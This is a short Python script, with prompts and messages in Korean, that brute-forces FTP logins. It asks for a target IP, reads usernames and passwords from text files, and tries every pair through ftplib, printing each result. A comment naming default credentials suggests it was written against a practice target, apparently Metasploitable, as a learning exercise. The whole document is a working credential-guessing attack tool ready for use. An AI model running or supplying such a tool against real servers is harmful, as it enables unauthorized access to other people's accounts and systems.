import ftplib

def bruteforce(ip, user, password):
    ftp = ftplib.FTP(ip)

    try:
        print("사용자 아이디 {}, 패스워드 {} ".format(user,password))
        res = ftp.login(user, password)
        print(res)

    except Exception as ex:
        print("연결 오류", ex)
    
def main():

    ip = input("IP정보를 입력하시오.")
    with open('users.txt','r') as users:
        users = users.readlines()
    with open('passwords.txt','r') as passwords:
        passwords = passwords.readlines()


    for user in users:
        for password in passwords:
            bruteforce(ip, user.rstrip(), password.rstrip())
    #id, password : msfadmim

if __name__ == '__main__':
    main()
